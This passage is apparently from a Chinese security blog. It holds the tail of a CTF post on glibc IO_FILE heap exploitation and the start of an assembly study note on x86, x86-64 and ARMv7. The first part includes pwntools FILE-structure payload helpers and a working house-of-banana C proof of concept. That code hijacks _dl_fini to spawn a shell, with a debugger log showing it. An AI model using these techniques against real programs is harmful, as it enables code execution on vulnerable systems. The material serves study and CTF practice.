<li>io_list_all 地址</li>
<li>伪造的 vtable 地址</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>fileStr = FileStructure(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = fileStr.orange(io_list_all=<span class="number">0xfacef00d</span>, vtable=<span class="number">0xcafebabe</span>)</span><br></pre></td></tr></table></figure>


<ol start="3">
<li>stdout leak</li>
</ol>
<ul>
<li>从 addr 泄露 size 大小的数据</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fileStr = FileStructure(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = fileStr.write(addr=<span class="number">0xcafebabe</span>, size=<span class="number">100</span>)</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>packing，因为我们需要伪造file结构体，因此我们可以使用如下函数</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 根据 context.arch打包， 类似 p32，p64 函数</span></span><br><span class="line">flat([</span><br><span class="line">	  con1,</span><br><span class="line">	  con2</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># offset: con, 类似于 cyclic(offset) + p64(con)</span></span><br><span class="line">flat(&#123;</span><br><span class="line">	<span class="number">0xe0</span>: <span class="number">100</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 相对偏移</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flat(&#123;<span class="number">0xe0</span>:&#123;<span class="number">0x0</span>: <span class="number">100</span>, <span class="number">0x10</span>: <span class="number">200</span>&#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 同时可以指定填充内容 和 总长度，因为我们伪造结构体需要满足一定条件</span></span><br><span class="line">flat(&#123;<span class="number">0xe0</span>:<span class="number">0x100</span>&#125;, filler=<span class="string">b&quot;\x00&quot;</span>, length=<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用法和flat(&#123;&#125;) 一样 官方文档是 alias of flat</span></span><br><span class="line">fit(&#123;&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>最好手动调试一下 largebin attack 和 house_of_banana。</p>
<h3 id="house-of-banana-1"><a href="#house-of-banana-1" class="headerlink" title="house of banana"></a>house of banana</h3><p>参考一下 <a href="https://giles-one.github.io/2021/10/04/house-of-%E7%B3%BB%E5%88%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">house_of_banana源码分析</a>这一篇文章的demo</p>
<ul>
<li>注意改rtld相关指针和libc的偏移大小</li>
</ul>
<p>makefile</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">CC := gcc</span><br><span class="line">CFLAFS := -g </span><br><span class="line"></span><br><span class="line">all: house_of_banana large_bin_attack</span><br><span class="line"><span class="keyword">default</span>: house_of_banana  large_bin_attack</span><br><span class="line"></span><br><span class="line">TARGET := house_of_banana  large_bin_attack</span><br><span class="line"></span><br><span class="line">house_of_banana: house_of_banana.c </span><br><span class="line">	$(CC) $(CFLAFS) $^ -o $@</span><br><span class="line"></span><br><span class="line">large_bin_attack: large_bin_attack.c </span><br><span class="line">	$(CC) $(CFLAFS) $^ -o $@</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">	rm -f $(TARGET) </span><br></pre></td></tr></table></figure>

<p>house of banana</p>
<ul>
<li>伪造结构体 l_next 为 0</li>
<li>l_init_called 一个比较神奇的数字，具体的libc打印</li>
<li>ubuntu 22.04 LTS 测试一下，在gdb 下可以执行一个命令就会崩溃。</li>
<li>高版本libc 没有patch进行测试，但是根据源码可行（理论上）</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123; </span><br><span class="line">  <span class="built_in">execve</span>(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">get_libc_base</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">uint64_t</span> to;</span><br><span class="line">  <span class="type">uint64_t</span> from;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line"></span><br><span class="line">  FILE *file;</span><br><span class="line">  file = <span class="built_in">fopen</span>(<span class="string">&quot;/proc/self/maps&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">fgets</span>(buf, <span class="built_in">sizeof</span>(buf), file)) &#123;</span><br><span class="line">    <span class="comment">// printf(&quot;%s\n&quot;, buf);</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;libc.so.6&quot;</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%lx-%lx&quot;</span>, &amp;from, &amp;to);</span><br><span class="line">      <span class="built_in">fclose</span>(file);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;libc =&gt; %#lx-%#lx\n&quot;</span>, from, to);</span><br><span class="line">      <span class="comment">// getchar();</span></span><br><span class="line">      <span class="keyword">return</span> from;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> libc_base = <span class="built_in">get_libc_base</span>();</span><br><span class="line">  <span class="type">uint64_t</span> rtld_global = libc_base + <span class="number">0x3fd040</span>;</span><br><span class="line">  <span class="comment">// &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span></span><br><span class="line">  <span class="type">uint64_t</span> *next_node = (<span class="type">uint64_t</span> *)(rtld_global - <span class="number">0x41ec8</span>);</span><br><span class="line">  <span class="type">uint64_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="type">uint64_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="type">uint64_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="type">uint64_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);  <span class="comment">// force p1 insert in to the largebin</span></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  p1[<span class="number">3</span>] = ((<span class="type">uint64_t</span>)next_node - <span class="number">0x20</span>);  <span class="comment">// push p2 into unsoteded bin</span></span><br><span class="line">  <span class="type">uint64_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);          <span class="comment">// force p2 insert in to the largebin</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 类似一个 uaf 修改</span></span><br><span class="line">  <span class="type">uint64_t</span> fake = (<span class="type">uint64_t</span>)p2 - <span class="number">0x10</span>;  <span class="comment">// chunk_header</span></span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x28</span>) = fake;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x31c</span>) = <span class="number">0x4011d</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x110</span>) = fake + <span class="number">0x40</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x48</span>) = fake + <span class="number">0x58</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x58</span>) = (<span class="type">uint64_t</span>)shell;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x120</span>) = fake + <span class="number">0x48</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x50</span>) = <span class="number">0x8</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 修改 _rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next 的地址为 p2</span></span><br><span class="line">  <span class="comment">// 最后一个linkmap链表遍历 p2</span></span><br><span class="line">  <span class="comment">// 建议 p *(struct link_map *) p2_addr 看一下</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 问题：assert i &lt; nloaded 错误，因此要将 (struct linkmap *p2) -&gt;l_next 置为0</span></span><br><span class="line">  p2[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// l_init_called 为0</span></span><br><span class="line">  <span class="comment">// *(uint64_t*)(fake+0x31c) = 0x4011d; 像是一个magic number</span></span><br><span class="line">  <span class="comment">// 必须为其余类型的值，因此打印出来替换</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 最后的程序崩溃了😥.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    0x7ffff7fc9242 &lt;_dl_fini+514&gt;    nop    word ptr [rax + rax]</span></span><br><span class="line"><span class="comment">    0x7ffff7fc9248 &lt;_dl_fini+520&gt;    mov    qword ptr [rbp - 0x38], rax</span></span><br><span class="line"><span class="comment">  ► 0x7ffff7fc924c &lt;_dl_fini+524&gt;    call   qword ptr [rax] &lt;shell&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  pwndbg&gt; bt</span></span><br><span class="line"><span class="comment">    #0  0x000055555555529b in shell () at house_of_banana.c:7</span></span><br><span class="line"><span class="comment">    #1  0x00007ffff7fc924e in _dl_fini () at ./elf/dl-fini.c:142</span></span><br><span class="line"><span class="comment">    #2  0x00007ffff7c45495 in __run_exit_handlers (status=0,</span></span><br><span class="line"><span class="comment">    # ...</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 但是发现在gdb 调试情况下可以执行一次命令就会崩溃</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; c</span></span><br><span class="line"><span class="comment">Continuing.</span></span><br><span class="line"><span class="comment">process 6591 is executing new program: /usr/bin/dash</span></span><br><span class="line"><span class="comment">Error in re-setting breakpoint 2: Function &quot;shell&quot; not defined.</span></span><br><span class="line"><span class="comment">[Thread debugging using libthread_db enabled]</span></span><br><span class="line"><span class="comment">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span></span><br><span class="line"><span class="comment">$ cat flag.txt</span></span><br><span class="line"><span class="comment">[Attaching after Thread 0x7ffff7fa7740 (LWP 6591) vfork to child process 6594]</span></span><br><span class="line"><span class="comment">[New inferior 2 (process 6594)]</span></span><br><span class="line"><span class="comment">[Thread debugging using libthread_db enabled]</span></span><br><span class="line"><span class="comment">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span></span><br><span class="line"><span class="comment">[Detaching vfork parent process 6591 after child exec]</span></span><br><span class="line"><span class="comment">[Inferior 1 (process 6591) detached]</span></span><br><span class="line"><span class="comment">process 6594 is executing new program: /usr/bin/cat</span></span><br><span class="line"><span class="comment">[Thread debugging using libthread_db enabled]</span></span><br><span class="line"><span class="comment">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span></span><br><span class="line"><span class="comment">flag&#123;house_of_banana_is_good&#125;</span></span><br><span class="line"><span class="comment">[Inferior 2 (process 6594) exited normally]</span></span><br><span class="line"><span class="comment">$ [5]  + 6580 suspended (tty output)  gdb house_of_banana</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://bbs.kanxue.com/thread-275968.htm">IO_FILE 入门</a></li>
<li><a href="https://bbs.kanxue.com/thread-273895.htm">House of cat新型glibc中IO利用手法解析|安全招聘|kanxue.com</a></li>
<li><a href="https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/">House of Apple 一种新的glibc中IO攻击方法</a></li>
<li><a href="https://www.anquanke.com/post/id/222948">house of banana-安全客</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编学习</title>
    <url>/2023/06/10/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<blockquote>
<p>基本的汇编学习。</p>
</blockquote>
<span id="more"></span>

<ul>
<li><p>学习目标：首先能看懂。然后尝试编写 <code>shellcode</code>。</p>
</li>
<li><p>个人习惯小写指令。</p>
</li>
<li><p><code>little-endian</code></p>
</li>
<li><p>常见的汇编格式</p>
<ul>
<li>Intel格式。</li>
<li>AT&amp;T，实际使用也很常见(Linux中默认的格式)</li>
</ul>
</li>
<li><p>部分名词</p>
</li>
</ul>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ISA: Instruction Set Architecture, 指令集架构</span><br><span class="line">RISC: Reduced Instruction Set Computer, 精简指令集计算机</span><br><span class="line">CISC: Complex Instruction Set Computer, 复杂指令集计算机</span><br><span class="line">ABI: application binary interface</span><br></pre></td></tr></table></figure>

<h2 id="环境问题"><a href="#环境问题" class="headerlink" title="环境问题"></a>环境问题</h2><ul>
<li><p>本机 linux: ubuntu &amp;&amp; kali virtual machine；CPU: AMD。</p>
<ul>
<li>无法直接运行 <code>arm</code> 和 <code>mips</code> 架构的程序</li>
</ul>
</li>
<li><p>arm可以使用手机终端 <a href="https://termux.dev/en/">Termux</a> 进行运行。或者购买云服务器?</p>
</li>
</ul>
<h3 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h3><ul>
<li><p>基本环境 <code>user mode+kernel mode</code>。 </p>
<ul>
<li>运行程序只需要一个<code>qemu-user</code> 就行，启动系统需要 <code>qemu-system-xxx</code></li>
<li>甚至可以 <code>qemu-system</code> 跑kernel，然后跑程序😂<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># qemu user用户态 system启动内核镜像</span></span><br><span class="line">sudo apt install qemu-user</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>arm 环境</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gun 编译工具链 + 动态链接库</span></span><br><span class="line">sudo apt list gcc* | grep arm</span><br><span class="line">sudo apt install gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu</span><br><span class="line"></span><br><span class="line"><span class="comment"># optional: qemu arm system mode</span></span><br><span class="line">sudo apt list  <span class="string">&quot;qemu*&quot;</span> <span class="comment"># 寻找对用的arch</span></span><br><span class="line">sudo apt install qemu-system-arm qemu-system-aarch64</span><br></pre></td></tr></table></figure>

<ul>
<li>mips 环境.</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gun 编译工具链</span></span><br><span class="line">sudo apt install gcc-mips-linux-gnu gcc-mips64-linux-gnuabi64 gcc-mipsel-linux-gnu gcc-mips64el-linux-gnuabi64</span><br><span class="line"></span><br><span class="line"><span class="comment"># optional: qemu mips system mode, 目前没见过， user mode 应该够了</span></span><br><span class="line">sudo apt install qemu-system-mips</span><br></pre></td></tr></table></figure>

<ul>
<li>gdb</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install gdb gdb-multiarch</span><br></pre></td></tr></table></figure>

<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><ul>
<li><p>qemu-user 使用 <code>-g</code> gdb模式 确定gdb调试端口</p>
</li>
<li><p>qemu-system 使用 <code>-s -S  或者 -gdb tcp:1234</code> gdbserver等待连接，默认端口 <code>1234</code></p>
</li>
<li><p>编程测试</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;hello, world!&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>寻找动态链接库。<code>lib-&gt;/usr/lib</code> 的链接</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> -al /usr/lib | grep arm  <span class="comment"># aarch64 mips...</span></span><br></pre></td></tr></table></figure>

<ul>
<li>arm 测试，不知为什么，测试时 <code>-g</code>放前面才成功</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编译</span></span><br><span class="line">arm-linux-gnueabi-gcc hello.c -o helloarm -g</span><br><span class="line">aarch64-linux-gnu-gcc hello.c -o helloaarch -g</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">$ qemu-arm -L /usr/arm-linux-gnueabi ./helloarm</span><br><span class="line">$ qemu-aarch64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调试</span></span><br><span class="line">$ qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./helloarm </span><br><span class="line">$ gdb-multiarch</span><br><span class="line">gdb&gt; <span class="built_in">set</span> <span class="built_in">arch</span> arm <span class="comment"># aarch64</span></span><br><span class="line">gdb&gt; target remote localhost:1234</span><br><span class="line">xxx </span><br></pre></td></tr></table></figure>

<ul>
<li>mips 测试, 与arm类似</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ mips-linux-gnu-gcc hello.c -o hellomips -g</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><ul>
<li>CISC</li>
</ul>
<h3 id="x86-1"><a href="#x86-1" class="headerlink" title="x86"></a>x86</h3><ul>
<li>intel x86 通用寄存器</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 通用</span><br><span class="line">eax: 累加器</span><br><span class="line">ebx: 一般基址寄存器，base</span><br><span class="line">ecx: counter, 在loop时，默认计数</span><br><span class="line">edx: 一般用于存放data</span><br><span class="line"></span><br><span class="line">esi: source index, 处理字符串常用</span><br><span class="line">edi: destinatin index, 处理字符串常用</span><br><span class="line"></span><br><span class="line">esp: stack pointer, 栈顶</span><br><span class="line">ebp: base pointer, 栈基址</span><br><span class="line"></span><br><span class="line">eip: 指向将要执行的指令。</span><br></pre></td></tr></table></figure>

<ul>
<li>标志位 <code>eflags</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CF: carry flag, 进位</span><br><span class="line">ZF: zero, 0</span><br><span class="line">SF: sign, 符号</span><br><span class="line">OF: overflow, 溢出</span><br><span class="line">TF: trap, 跟踪</span><br><span class="line">IF: interrupt, 中断</span><br><span class="line">PF: parity, 奇偶</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ul>
<li>段寄存器</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cs: code segment 代码段</span><br><span class="line">ds: data 数据段</span><br><span class="line">ss: stack 堆栈段</span><br><span class="line">es: extend 扩展段</span><br><span class="line">fs: 数据段</span><br><span class="line">gs: 数据段</span><br></pre></td></tr></table></figure>

<ul>
<li>控制寄存器</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 某些保护模式</span><br><span class="line">cr0-cr4</span><br></pre></td></tr></table></figure>

<ul>
<li>寻址</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov</span><br><span class="line">lea</span><br></pre></td></tr></table></figure>

<ul>
<li>算术指令</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 基本运算</span><br><span class="line">add</span><br><span class="line">sub</span><br><span class="line">mul</span><br><span class="line">div</span><br><span class="line">inc</span><br><span class="line">dec</span><br><span class="line"></span><br><span class="line">; 逻辑运算</span><br><span class="line">cmp</span><br><span class="line">and</span><br><span class="line">or</span><br><span class="line">xor</span><br><span class="line">not</span><br><span class="line"></span><br><span class="line">; 移位操作</span><br><span class="line">shl  ; shift left</span><br><span class="line">shr</span><br><span class="line">sal  ; shift arithmetic left 算数左移</span><br><span class="line">sar</span><br></pre></td></tr></table></figure>

<ul>
<li>跳转</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; jmp 类</span><br><span class="line">jmp</span><br><span class="line">jb   ; blow</span><br><span class="line">jg   ; greater</span><br></pre></td></tr></table></figure>

<ul>
<li>函数调用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call function</span><br><span class="line">; call 执行时，保存 eip+4, 并跳转到对应地址</span><br><span class="line">; 参数传递，使用栈传递参数</span><br></pre></td></tr></table></figure>

<ul>
<li>栈帧</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 在调用子程序时，会开辟子程序的栈帧。esp和ebp保存栈顶和栈底</span><br><span class="line">; 在返回父程序需要还原esp, ebp指针。</span><br><span class="line">; 栈 低地址生长</span><br><span class="line"></span><br><span class="line">; sp自动变化</span><br><span class="line">push ebx  ; sp-4</span><br><span class="line">pop rax   ; sp+4</span><br></pre></td></tr></table></figure>

<ul>
<li>系统调用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 系统中断处理syscall</span><br><span class="line">int 0x80            ; eax系统调用号 ebx, ecx, edx对应函数前三个参数</span><br></pre></td></tr></table></figure>


<h3 id="x86-64"><a href="#x86-64" class="headerlink" title="x86-64"></a>x86-64</h3><ul>
<li><p>实际上x86-64与AMD64基本是同一个ISA，现在我们使用购买的Intel或者AMD生产的CPU，都属于x86-64的ISA。</p>
</li>
<li><p>x86-64: 64位，可寻址 <code>2^64</code>, 兼容x86</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 32位 r-&gt;b比如 rax-&gt;eax</span><br><span class="line">rax, rbx, rcx, rdx</span><br><span class="line">rsi, rdi</span><br><span class="line">rsp, rbp</span><br><span class="line">r8: r8d 32位 寄存器，低32位</span><br><span class="line">r9: r9d</span><br><span class="line">r10: ...</span><br><span class="line">r11: ...</span><br><span class="line">r12: ...</span><br><span class="line">r13: ...</span><br><span class="line">r14: ...</span><br><span class="line">r15: ...</span><br></pre></td></tr></table></figure>


<ul>
<li>Linux下函数调用约定, 与x86相差较大</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 函数参数</span><br><span class="line">rdi, rsi, rdx, rcx, r8, r9           ; 传递前6个参数，第7个参数开始和x86一样使用栈传递</span><br><span class="line"></span><br><span class="line">; 返回值</span><br><span class="line">rax</span><br></pre></td></tr></table></figure>

<ul>
<li>系统调用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; syscall</span><br><span class="line">rax: 系统调用号</span><br><span class="line">; 参数传递与函数一致， rdi, rsi...</span><br></pre></td></tr></table></figure>

<h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><ul>
<li><p>RISC</p>
</li>
<li><p>ARM指令格式</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">label op-code oprand1 oprand2 oprand3 ...        @commit</span><br><span class="line"></span><br><span class="line">@ 更加学术 rd: destination; rn: 寄存器中用于算术运算的操作数; shifter_operand: 数据处理指令</span><br><span class="line">&lt;opcode&gt; &#123;&lt;cond&gt;&#125; &#123;S&#125; &lt;rd&gt;,&lt;rn&gt;,&lt;shifter_operand&gt;</span><br><span class="line"></span><br><span class="line">@ 注释  `@`, `//`  `/**/` `;`</span><br></pre></td></tr></table></figure>

<h3 id="ARMv7"><a href="#ARMv7" class="headerlink" title="ARMv7"></a>ARMv7</h3><ul>
<li><p>32位指令集<code>A32</code>，兼容16位指令集<code>T16</code></p>
<ul>
<li>由于ARMv7 兼容 <code>ARM</code>和 <code>Thumb</code>指令集，区分两个指令集： <code>addr &amp; 1 == 1</code>代表<code>thumb</code>指令集</li>
</ul>
</li>
<li><p>ARMv7通用寄存器</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r0-r3: args, 函数前四个参数，返回值也会存入r0. </span><br><span class="line">r4-r10:  </span><br><span class="line">r11: fp, frame pointer</span><br><span class="line">r12: ip, Intra-Procedure-call scratch register, 在新版本当作通用寄存器使用，会在bl时引发bug</span><br><span class="line">r13: sp, stack pointer</span><br><span class="line">r14: lr, link register</span><br><span class="line">r15: pc, program count, 指向下一条需要执行的指令</span><br></pre></td></tr></table></figure>

<ul>
<li>标志位(CPSR: program status reg),如果想改变，需要在某些指令后加 <code>s</code> (sub -&gt; subs)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">N: negative, 运算结果&gt;=0 N=0, 负数，N=1</span><br><span class="line">Z: zero, 为0</span><br><span class="line">C: carry, 进位</span><br><span class="line">V: overflow 有溢出</span><br><span class="line"></span><br><span class="line">; cmp 可以改变</span><br><span class="line">cmp r0, r1</span><br></pre></td></tr></table></figure>

<ul>
<li>mov 立即数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov r0, #1     @ r0 &lt;- 1</span><br><span class="line"></span><br><span class="line">@ 特殊寄存器 cpsr || spsr</span><br><span class="line">mrs r0, cpsr   @ r0 &lt;- cpsr</span><br><span class="line">msr cpsr, r1   @ cpsr &lt;- r1</span><br></pre></td></tr></table></figure>

<ul>
<li>访问内存</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ 不能直接像intel mov访问内存, 使用 load, store命令间接访问内存</span><br><span class="line">ldr rd, [rn , #offset]   @ load register</span><br><span class="line">str rd, [rn, #offset]</span><br><span class="line">ldm                      @ load multiple</span><br><span class="line">stm  </span><br><span class="line"></span><br><span class="line">; 例子</span><br><span class="line">ldr r0, =0X20000002  @ r0=0X20000002，加载地址到寄存器 </span><br><span class="line">str r1, [r0]         @ r1 中的值写入到 r0 中所保存的地址中</span><br></pre></td></tr></table></figure>

<ul>
<li>算术指令</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ 基本算数运算</span><br><span class="line">add rd, rn, rm   @ rd = rn + rm</span><br><span class="line">sub rd, rn, rm   @ rd = rn - rm</span><br><span class="line">mul rd, rn, rm   @ rd = rn * rm</span><br><span class="line">sdiv rd, rn, rm  @ rd = rn / rm, s(ign)div u(nsign)div</span><br><span class="line"></span><br><span class="line">@ 想改变标志位, 加 &#x27;s&#x27; =&gt; subs...</span><br><span class="line"></span><br><span class="line">@ 逻辑运算</span><br><span class="line">and rd, rn       @ rd = rd &amp; rn</span><br><span class="line">and rd, rn, #imm @ rd = rn &amp; #imm</span><br><span class="line">orr rd, rn       @ rd = rd | rn</span><br><span class="line">eor rd, rn       @ rd = rd ^ rn</span><br><span class="line"></span><br><span class="line">@ 移位操作</span><br><span class="line">lsl   @ logic shift left 逻辑左移</span><br><span class="line">lsr   @ 逻辑右移</span><br><span class="line">asr   @ arithmetic shift right 算数右移</span><br><span class="line">ror   @ rotate right 循环右移</span><br></pre></td></tr></table></figure>


<ul>
<li>程序跳转</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b: 直接跳到label。 branch</span><br><span class="line">bx: 跳转+状态切换    @ ARM/Thumb 模式(使用一次，切换一次)</span><br><span class="line">bl: b + link, 首先保存下一条指令地址到lr, 然后改变pc。</span><br><span class="line">blx: bl+bx</span><br><span class="line"></span><br><span class="line">@ 条件跳转, 状态寄存器</span><br><span class="line">eq: equal 相等</span><br><span class="line">ne: not eq</span><br><span class="line">lt: less </span><br><span class="line">le: less equal</span><br></pre></td></tr></table></figure>

<ul>
<li>函数调用</li>
</ul>
